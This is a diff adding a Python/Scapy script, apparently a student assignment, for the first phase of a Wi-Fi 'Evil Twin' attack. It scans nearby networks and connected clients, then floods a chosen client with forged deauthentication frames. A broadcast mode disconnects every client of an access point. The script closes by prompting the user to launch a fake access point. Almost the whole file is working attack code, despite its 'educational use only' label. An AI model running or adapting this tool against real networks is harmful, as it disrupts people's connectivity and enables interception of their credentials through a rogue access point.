@@ -1,0 +1,452 @@
+#!/usr/bin/env python3
+"""
+Enhanced Evil Twin Attack - Integrated Scanning and Deauth
+Educational purposes only - Assignment 1
+Combines scanning functionality with improved deauth attack
+"""
+
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Deauth
+import time
+import os
+import threading
+from datetime import datetime
+import signal
+import sys
+
+class EvilTwinAttacker:
+    def __init__(self, interface):
+        """
+        Initialize the Evil Twin attacker
+        
+        Args:
+            interface (str): Monitor mode interface
+        """
+        self.interface = interface
+        self.networks = {}  # Store discovered networks
+        self.clients = []   # Store discovered clients
+        self.target_network = None
+        self.target_client = None
+        self.is_attacking = False
+        self.attack_thread = None
+        
+    def set_monitor_mode(self, wlan_interface):
+        """
+        Set interface to monitor mode
+        
+        Args:
+            wlan_interface (str): Interface name (e.g., wlan0)
+        """
+        print(f"[INFO] Setting {wlan_interface} to monitor mode...")
+        try:
+            os.system(f'ifconfig {wlan_interface} down')
+            os.system(f'iwconfig {wlan_interface} mode monitor')
+            os.system(f'ifconfig {wlan_interface} up')
+            print(f"[SUCCESS] {wlan_interface} set to monitor mode")
+            return True
+        except Exception as e:
+            print(f"[ERROR] Failed to set monitor mode: {e}")
+            return False
+    
+    def set_managed_mode(self, wlan_interface):
+        """
+        Set interface back to managed mode
+        
+        Args:
+            wlan_interface (str): Interface name
+        """
+        print(f"[INFO] Setting {wlan_interface} back to managed mode...")
+        try:
+            os.system(f"sudo ip link set {wlan_interface} down")
+            os.system(f"sudo iw {wlan_interface} set type managed")
+            os.system(f'ifconfig {wlan_interface} up')
+            print(f"[SUCCESS] {wlan_interface} set to managed mode")
+        except Exception as e:
+            print(f"[ERROR] Failed to set managed mode: {e}")
+    
+    def switch_channels(self, timeout_seconds=60, start_channel=1):
+        """
+        Continuously switch channels during scanning
+        
+        Args:
+            timeout_seconds (int): How long to switch channels
+            start_channel (int): Starting channel
+        """
+        start_time = datetime.now()
+        channel = start_channel
+        
+        while (datetime.now() - start_time).seconds < timeout_seconds:
+            channel = (channel % 14) + 1
+            os.system(f'iwconfig {self.interface} channel {channel}')
+            time.sleep(0.5)  # Faster channel switching
+    
+    def scan_networks(self, scan_duration=60):
+        """
+        Scan for available networks
+        
+        Args:
+            scan_duration (int): Scan duration in seconds
+            
+        Returns:
+            dict: Dictionary of discovered networks
+        """
+        print(f"[INFO] Starting network scan for {scan_duration} seconds...")
+        print("[INFO] Press Ctrl+C to stop early")
+        print("-" * 60)
+        print("INDEX | SSID                     | BSSID             | CHANNEL")
+        print("-" * 60)
+        
+        self.networks.clear()
+        
+        def packet_handler(pkt):
+            if pkt.haslayer(Dot11):
+                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+                    bssid = pkt[Dot11].addr2
+                    
+                    if bssid not in self.networks:
+                        try:
+                            ssid = pkt[Dot11Elt][0].info.decode('utf-8', errors='ignore')
+                            if not ssid:  # Hidden network
+                                ssid = "<Hidden>"
+                            
+                            # Get channel from RadioTap if available
+                            channel = "Unknown"
+                            if pkt.haslayer(RadioTap):
+                                try:
+                                    channel = pkt[RadioTap].channel
+                                except:
+                                    channel = "Unknown"
+                            
+                            self.networks[bssid] = {
+                                'ssid': ssid,
+                                'bssid': bssid,
+                                'channel': channel
+                            }
+                            
+                            index = len(self.networks)
+                            print(f"{index:5d} | {ssid:<24} | {bssid:<17} | {channel}")
+                            
+                        except Exception as e:
+                            pass  # Skip problematic packets
+        
+        # Start channel switching thread
+        channel_thread = threading.Thread(
+            target=self.switch_channels,
+            args=(scan_duration,),
+            daemon=True
+        )
+        channel_thread.start()
+        
+        try:
+            # Start sniffing
+            sniff(iface=self.interface, prn=packet_handler, timeout=scan_duration)
+        except KeyboardInterrupt:
+            print("\n[INFO] Scan stopped by user")
+        
+        channel_thread.join()
+        print(f"\n[SUCCESS] Found {len(self.networks)} networks")
+        return self.networks
+    
+    def scan_clients(self, target_bssid, scan_duration=30):
+        """
+        Scan for clients connected to a specific network
+        
+        Args:
+            target_bssid (str): BSSID of target network
+            scan_duration (int): Scan duration in seconds
+            
+        Returns:
+            list: List of discovered clients
+        """
+        print(f"[INFO] Scanning for clients connected to {target_bssid}")
+        print(f"[INFO] Scan duration: {scan_duration} seconds")
+        print("-" * 40)
+        print("INDEX | CLIENT MAC")
+        print("-" * 40)
+        
+        self.clients.clear()
+        
+        def client_handler(pkt):
+            if pkt.haslayer(Dot11):
+                # Check if packet is related to target network
+                if (pkt.addr2 == target_bssid or pkt.addr3 == target_bssid) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
+                    client_mac = pkt.addr1
+                    
+                    # Filter out broadcast and already found clients
+                    if (client_mac not in self.clients and 
+                        client_mac != target_bssid and 
+                        client_mac != pkt.addr2 and 
+                        client_mac != pkt.addr3 and 
+                        client_mac):
+                        
+                        self.clients.append(client_mac)
+                        index = len(self.clients)
+                        print(f"{index:5d} | {client_mac}")
+        
+        try:
+            sniff(iface=self.interface, prn=client_handler, timeout=scan_duration)
+        except KeyboardInterrupt:
+            print("\n[INFO] Client scan stopped by user")
+        
+        print(f"\n[SUCCESS] Found {len(self.clients)} clients")
+        return self.clients
+    
+    def create_deauth_packet(self, target_mac, ap_bssid, reason_code=7):
+        """
+        Create deauth packets - improved version with both directions
+        
+        Args:
+            target_mac (str): Target client MAC
+            ap_bssid (str): AP BSSID
+            reason_code (int): Deauth reason code
+            
+        Returns:
+            tuple: (packet_to_client, packet_to_ap)
+        """
+        # Packet from AP to client (kick client)
+        pkt_to_client = RadioTap() / Dot11(
+            addr1=target_mac,  # Destination (client)
+            addr2=ap_bssid,    # Source (AP)
+            addr3=ap_bssid     # BSSID
+        ) / Dot11Deauth(reason=reason_code)
+        
+        # Packet from client to AP (tell AP to forget client)
+        pkt_to_ap = RadioTap() / Dot11(
+            addr1=ap_bssid,    # Destination (AP)
+            addr2=target_mac,  # Source (client)
+            addr3=ap_bssid     # BSSID
+        ) / Dot11Deauth(reason=reason_code)
+        
+        return pkt_to_client, pkt_to_ap
+    
+    def deauth_attack(self, target_mac, ap_bssid, attack_duration=15):
+        """
+        Perform targeted deauth attack - improved version
+        
+        Args:
+            target_mac (str): Target client MAC
+            ap_bssid (str): AP BSSID
+            attack_duration (int): Attack duration in seconds
+        """
+        print(f"\n[ATTACK] Starting targeted deauth attack")
+        print(f"[TARGET] Client: {target_mac}")
+        print(f"[TARGET] AP: {ap_bssid}")
+        print(f"[DURATION] {attack_duration} seconds")
+        print("[INFO] Attack in progress...")
+        
+        start_time = time.time()
+        packets_sent = 0
+        
+        while time.time() - start_time < attack_duration and self.is_attacking:
+            try:
+                # Create deauth packets
+                pkt_to_client, pkt_to_ap = self.create_deauth_packet(target_mac, ap_bssid)
+                
+                # Send burst of packets
+                for _ in range(5):  # Send 5 packets quickly
+                    if not self.is_attacking:
+                        break
+                    
+                    sendp(pkt_to_client, iface=self.interface, verbose=False)
+                    sendp(pkt_to_ap, iface=self.interface, verbose=False)
+                    packets_sent += 2
+                
+                time.sleep(0.1)  # Brief pause between bursts
+                
+            except Exception as e:
+                print(f"[ERROR] Error during deauth attack: {e}")
+                break
+        
+        print(f"\n[COMPLETE] Deauth attack finished. Sent {packets_sent} packets")
+    
+    def broadcast_deauth(self, ap_bssid, attack_duration=10):
+        """
+        Broadcast deauth attack (kicks all clients) - like the original code
+        
+        Args:
+            ap_bssid (str): Target AP BSSID
+            attack_duration (int): Attack duration in seconds
+        """
+        print(f"\n[ATTACK] Starting broadcast deauth attack on {ap_bssid}")
+        print(f"[WARNING] This will disconnect ALL clients from the network")
+        
+        broadcast_mac = "ff:ff:ff:ff:ff:ff"
+        start_time = time.time()
+        packets_sent = 0
+        
+        while time.time() - start_time < attack_duration and self.is_attacking:
+            try:
+                # Create broadcast deauth packet
+                pkt = RadioTap() / Dot11(
+                    addr1=broadcast_mac,  # Broadcast
+                    addr2=ap_bssid,      # AP
+                    addr3=ap_bssid       # BSSID
+                ) / Dot11Deauth(reason=7)
+                
+                sendp(pkt, iface=self.interface, count=10, inter=0.01, verbose=False)
+                packets_sent += 10
+                time.sleep(0.5)
+                
+            except Exception as e:
+                print(f"[ERROR] Error during broadcast deauth: {e}")
+                break
+        
+        print(f"\n[COMPLETE] Broadcast deauth finished. Sent {packets_sent} packets")
+    
+    def start_attack(self, target_mac, ap_bssid, attack_duration=15):
+        """
+        Start deauth attack in separate thread
+        
+        Args:
+            target_mac (str): Target client MAC
+            ap_bssid (str): AP BSSID
+            attack_duration (int): Attack duration
+        """
+        if self.is_attacking:
+            print("[WARNING] Attack already in progress")
+            return False
+        
+        self.is_attacking = True
+        self.attack_thread = threading.Thread(
+            target=self.deauth_attack,
+            args=(target_mac, ap_bssid, attack_duration)
+        )
+        self.attack_thread.daemon = True
+        self.attack_thread.start()
+        
+        return True
+    
+    def stop_attack(self):
+        """Stop the current attack"""
+        if self.is_attacking:
+            print("[INFO] Stopping attack...")
+            self.is_attacking = False
+            
+            if self.attack_thread and self.attack_thread.is_alive():
+                self.attack_thread.join(timeout=5)
+            
+            print("[INFO] Attack stopped")
+        else:
+            print("[INFO] No active attack to stop")
+    
+    def select_target_network(self):
+        """Interactive network selection"""
+        if not self.networks:
+            print("[ERROR] No networks found. Run scan_networks() first")
+            return None
+        
+        try:
+            print("\nSelect target network:")
+            index = int(input("Enter network index: ")) - 1
+            
+            if 0 <= index < len(list(self.networks.values())):
+                self.target_network = list(self.networks.values())[index]
+                print(f"[SELECTED] Target network: {self.target_network['ssid']} ({self.target_network['bssid']})")
+                return self.target_network
+            else:
+                print("[ERROR] Invalid index")
+                return None
+                
+        except (ValueError, IndexError):
+            print("[ERROR] Invalid input")
+            return None
+    
+    def select_target_client(self):
+        """Interactive client selection"""
+        if not self.clients:
+            print("[ERROR] No clients found. Run scan_clients() first")
+            return None
+        
+        try:
+            print("\nSelect target client:")
+            index = int(input("Enter client index: ")) - 1
+            
+            if 0 <= index < len(self.clients):
+                self.target_client = self.clients[index]
+                print(f"[SELECTED] Target client: {self.target_client}")
+                return self.target_client
+            else:
+                print("[ERROR] Invalid index")
+                return None
+                
+        except (ValueError, IndexError):
+            print("[ERROR] Invalid input")
+            return None
+
+def main():
+    """Main function demonstrating the Evil Twin attack workflow"""
+    print("=" * 60)
+    print("EVIL TWIN ATTACK TOOL - EDUCATIONAL USE ONLY")
+    print("=" * 60)
+    
+    # Get interface
+    interface = input("Enter monitor interface name (e.g., wlan0mon): ")
+    
+    # Initialize attacker
+    attacker = EvilTwinAttacker(interface)
+    
+    try:
+        # Step 1: Scan for networks
+        print("\n[STEP 1] Scanning for networks...")
+        networks = attacker.scan_networks(scan_duration=30)
+        
+        if not networks:
+            print("[ERROR] No networks found. Exiting.")
+            return
+        
+        # Step 2: Select target network
+        print("\n[STEP 2] Select target network")
+        target_network = attacker.select_target_network()
+        
+        if not target_network:
+            print("[ERROR] No target selected. Exiting.")
+            return
+        
+        # Step 3: Scan for clients
+        print("\n[STEP 3] Scanning for clients...")
+        clients = attacker.scan_clients(target_network['bssid'], scan_duration=20)
+        
+        if not clients:
+            print("[WARNING] No clients found.")
+            choice = input("Continue with broadcast attack? (y/n): ").lower()
+            if choice == 'y':
+                attacker.broadcast_deauth(target_network['bssid'], attack_duration=15)
+            return
+        
+        # Step 4: Select target client
+        print("\n[STEP 4] Select target client")
+        target_client = attacker.select_target_client()
+        
+        if not target_client:
+            print("[ERROR] No client selected. Exiting.")
+            return
+        
+        # Step 5: Launch attack
+        print("\n[STEP 5] Launching targeted deauth attack")
+        print("Press Ctrl+C to stop the attack early")
+        
+        attacker.start_attack(
+            target_client,
+            target_network['bssid'],
+            attack_duration=20
+        )
+        
+        # Wait for attack to complete or user interrupt
+        try:
+            attacker.attack_thread.join()
+        except KeyboardInterrupt:
+            print("\n[INFO] Attack interrupted by user")
+            attacker.stop_attack()
+        
+        print("\n[COMPLETE] Evil Twin deauth phase completed")
+        print("[NEXT] Now launch your fake AP to complete the attack")
+        
+    except KeyboardInterrupt:
+        print("\n[INFO] Program interrupted by user")
+        attacker.stop_attack()
+    except Exception as e:
+        print(f"[ERROR] Unexpected error: {e}")
+        attacker.stop_attack()
+
+if __name__ == "__main__":
+    main()
